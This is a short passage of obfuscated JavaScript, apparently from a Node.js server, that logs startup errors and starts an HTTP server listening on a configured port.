_0x1f5dee=_0x4a5163;console[_0x1f5dee(0x1a3)]('Unhandled\x20error\x20in\x20startserver:',_0x50fd16);}),app[_0x4a5163(0x126)](PORT,()=>console[_0x4a5163(0x123)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
